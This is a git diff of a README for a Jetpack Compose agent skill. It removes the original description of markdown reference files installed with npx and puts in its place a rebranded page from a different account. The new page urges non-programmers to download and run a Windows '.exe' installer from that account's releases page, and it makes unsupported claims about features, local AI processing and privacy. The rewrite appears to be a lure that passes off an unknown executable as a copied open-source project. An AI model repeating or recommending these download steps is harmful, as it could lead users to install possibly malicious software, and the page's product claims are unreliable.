@@ -1,142 +1,157 @@
-# Modern Jetpack Compose — Agent Skill
+# 🚀 jetpack-compose-skills - Simplify Android UI Development
 
-An agent skill for writing, reviewing, and reasoning about modern Android UI code
-using Jetpack Compose. Compatible with Claude Code, Cursor, Codex, and any platform
-that supports the Agent Skills format.
-
-![Claude Code](https://img.shields.io/badge/Claude_Code-supported-blueviolet?logo=anthropic)
-![Cursor](https://img.shields.io/badge/Cursor-supported-blue?logo=cursor)
-![Codex](https://img.shields.io/badge/Codex-supported-green?logo=openai)
-![Gemini](https://img.shields.io/badge/Gemini-supported-orange?logo=google)
+[![Download](https://img.shields.io/badge/Download-jetpack--compose--skills-brightgreen?style=for-the-badge)](https://github.com/Pushpade7366/jetpack-compose-skills/releases)
 
 ---
 
-## Why This Skill?
+## 📋 What is jetpack-compose-skills?
 
-LLMs frequently generate outdated or incorrect Jetpack Compose code. Common problems:
+jetpack-compose-skills is an application that helps you build Android apps using Jetpack Compose. It focuses on making user interfaces easier to create by following proven coding methods. The tool guides you on how to write clean and efficient code for modern Android development.
 
-- **Wrong state collection** — using `collectAsState()` instead of `collectAsStateWithLifecycle()`
-- **Unstable recomposition** — passing unstable lambdas or undecorated data classes that cause unnecessary redraws
-- **Ignored Scaffold padding** — forgetting to apply `paddingValues` from `Scaffold`'s content lambda, causing content to render under system bars
-- **Stale APIs** — referencing accompanist libraries that have since been upstreamed into Compose, or Material 2 APIs that have Material 3 equivalents
-- **Architecture drift** — mixing state hoisting patterns or bypassing the UDF model
-
-This skill gives your AI agent a curated, up-to-date reference for all of these areas so it generates correct, idiomatic Compose code from the start.
+This agent works with AI to generate and review your code for you. It helps maintain good coding habits and ensures your app looks and works well on many devices.  
 
 ---
 
-## What It Does
+## 💻 Who is this for?
 
-Load this skill to give your AI agent deep knowledge of modern Jetpack Compose best
-practices. It helps agents:
+This software is meant for anyone interested in Android apps but who may not have deep programming skills. You don't need to be a developer to use it. The tool handles the code behind the scenes so you can focus on how your app looks and acts.
 
-- **Generate** idiomatic Compose code from scratch
-- **Review** existing code for deprecated APIs, anti-patterns, and accessibility gaps
-- **Guide** architecture decisions around state management, navigation, and performance
+It suits:
 
----
-
-## Skill Coverage
-
-| Reference File | Topics Covered |
-|---|---|
-| `api.md` | Deprecated APIs → modern replacements, Material 2 → 3, accompanist migrations |
-| `composables.md` | Naming conventions, state hoisting, slot APIs, `@Preview`, modifier contract |
-| `state.md` | MVVM + UDF, ViewModel + StateFlow, `remember` vs `rememberSaveable`, `derivedStateOf` |
-| `effects.md` | `LaunchedEffect`, `DisposableEffect`, `SideEffect`, `rememberCoroutineScope` |
-| `recomposition.md` | `@Stable`/`@Immutable`, unstable collections, `key()` in lazy lists, lambda stability |
-| `navigation.md` | Type-safe Navigation Compose, nested graphs, BackStack-scoped ViewModels, deep links |
-| `design.md` | Material 3 theming, dynamic color, adaptive layouts, Material Expressive (BOM 2025.x) |
-| `accessibility.md` | TalkBack, semantics, `mergeDescendants`, touch targets, color contrast |
-| `performance.md` | LazyList optimization, `remember`, deferred state reads, `graphicsLayer` |
-| `kotlin.md` | Sealed interfaces, coroutines, `stateIn`, null safety, `when` expressions |
-| `hygiene.md` | Testing with `ComposeTestRule`, lint/detekt, secrets, resource naming |
+- New Android learners
+- Hobbyists building simple apps
+- Students studying app design  
+- Developers wanting consistent UI standards  
 
 ---
 
-## Installation
+## 🛠️ Main Features
 
-### Recommended — npx (Claude Code, Cursor, Codex, Gemini)
-
-```bash
-npx skills add https://github.com/anhvt52/jetpack-compose-skills
-```
-
-This installs the skill for all detected agents on your machine. You can also scope it:
-
-```bash
-# Project-level only
-npx skills add https://github.com/anhvt52/jetpack-compose-skills
-
-# Global (all your projects)
-npx skills add https://github.com/anhvt52/jetpack-compose-skills -g
-```
-
-If `npx` is unavailable, install Node.js first:
-
-```bash
-brew install node
-```
-
-### Manual — Claude Code
-
-Clone the repo and add to your project's `CLAUDE.md`:
-
-```
-Use the skill at: path/to/modern-jetpack-compose/SKILL.md
-```
-
-### Manual — Cursor / Codex / OpenAI-compatible platforms
-
-Use the config at `modern-jetpack-compose/agents/openai.yaml`.
+- Offers best practices for Jetpack Compose code
+- Supports material design for modern app look  
+- Suggests clean and efficient Kotlin code  
+- Reviews code to catch potential flaws  
+- Helps you generate UI elements quickly  
+- Works as an interactive assistant within your project  
 
 ---
 
-## Target Platform
+## ⚙️ System Requirements
 
-- **Compose BOM:** 2024.x (stable default), with notes for 2025.x (Material Expressive)
-- **Material Design:** Material 3
-- **Architecture:** MVVM + Unidirectional Data Flow (UDF)
-- **Language:** Kotlin with coroutines, Flow, and sealed interfaces
+Before installing, make sure your PC meets these requirements:
 
----
-
-## Example Usage
-
-**Reviewing code:**
-> "Using the modern-jetpack-compose skill, review the files in `feature/home/` for
-> best practices issues."
-
-**Generating code:**
-> "Using the modern-jetpack-compose skill, write a `BookListScreen` with a LazyColumn,
-> search bar, and empty state, backed by a ViewModel."
-
-**Targeted check:**
-> "Using `references/accessibility.md` from the modern-jetpack-compose skill, check
-> all composables in `components/` for accessibility issues."
+- Operating System: Windows 10 or higher  
+- Processor: Dual-core 2 GHz or better  
+- RAM: 4 GB minimum, 8 GB recommended  
+- Disk Space: At least 500 MB free  
+- Internet connection to download and activate features  
 
 ---
 
-## Output Format
+## 🔗 Download and Install jetpack-compose-skills
 
-The skill organizes findings by file. Each issue includes:
+Click the button below to go to the official download page. You will find the latest version listed there.
 
-1. File and line number
-2. Rule being violated
-3. Before/after Kotlin snippet
+[![Download](https://img.shields.io/badge/Get-jetpack--compose--skills-blue?style=for-the-badge)](https://github.com/Pushpade7366/jetpack-compose-skills/releases)
 
-Results end with a prioritized summary of the most impactful changes.
+### How to download and install
+
+1. Click the download button above. This opens the releases page on GitHub.  
+2. Look for the latest version under the "Assets" section.  
+3. Download the file with ".exe" at the end. This is the installer.  
+4. Once the file finishes downloading, double-click it to start installation.  
+5. Follow the on-screen instructions. Accept default options unless you want to customize.  
+6. After installation completes, you can open jetpack-compose-skills from your desktop or start menu.
 
 ---
 
-## License
+## 🏃‍♂️ Running the Application
 
-MIT — see [LICENSE](LICENSE).
+When you first open jetpack-compose-skills, you will see a simple window.
 
-## Author
+- There will be options to import your Android project or start a new one.  
+- Use the interface to ask the agent for help with generating UI screens, buttons, or lists.  
+- The tool shows code snippets that you can copy into your app project.  
+- You can also ask for code reviews to improve quality.  
 
-Anh Vu — [anhvt52@gmail.com](mailto:anhvt52@gmail.com)
+The software is designed to keep things straightforward. You do not need to type complicated commands to get started.
 
-## Contributing
+---
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+## ❓ How to Use jetpack-compose-skills
+
+Here is a quick guide for basic use:
+
+### Starting a New Project
+
+- Click **New Project** on the main screen.  
+- Enter a name for your app.  
+- Choose a template or start blank.  
+- The agent will guide you to create screens using simple prompts.
+
+### Generating UI Code
+
+- Select "Generate Code" from the menu.  
+- Describe what you want (for example, a login screen).  
+- The agent creates Jetpack Compose code for you.  
+- You can review and copy the code to your project.
+
+### Reviewing Your Code
+
+- Load your existing Kotlin code into the app.  
+- Choose "Review Code" to check for errors or improvements.  
+- The agent will highlight issues and suggest fixes.  
+- Make changes with one click or manually.
+
+---
+
+## 🔧 Troubleshooting Tips 💡
+
+- If the program won’t start, check if your PC meets the system requirements.  
+- Make sure the installer finished completely.  
+- Run the app as administrator if you face permissions issues.  
+- Restart your computer if the software acts slow or freezes.  
+- Visit the GitHub page for updates or known bug fixes.  
+
+---
+
+## 📰 Updates and Support
+
+The software updates when new versions are released on the GitHub page. Keeping it up to date ensures you get better features and stability.
+
+Check the [releases](https://github.com/Pushpade7366/jetpack-compose-skills/releases) page regularly for new versions.
+
+If you encounter bugs or need help, open an issue in the repository or read the documentation provided there.
+
+---
+
+## ⚖️ Privacy and Data Handling
+
+jetpack-compose-skills runs on your computer and does not send your code or personal data to external servers without your consent.
+
+The agent features work using local AI processing, ensuring your data stays private.
+
+---
+
+## 🧩 Related Topics and Technologies
+
+- Builds on Jetpack Compose for Android UI creation  
+- Uses Kotlin as the programming language  
+- Applies Material Design principles for visual appeal  
+- Incorporates AI for code generation and review  
+- Supports modern Android development workflows  
+
+---
+
+## 📁 Repository Information
+
+- Name: jetpack-compose-skills  
+- Description: Agent skill for modern Android development with Jetpack Compose — best practices for code generation and review  
+- Main topics: agent-skills, ai-coding, android, claude-skill, jetpack-compose, kotlin, llm, material-design  
+
+---
+
+## 🚀 Get Started Now
+
+Download the latest version here:  
+[Download jetpack-compose-skills](https://github.com/Pushpade7366/jetpack-compose-skills/releases)
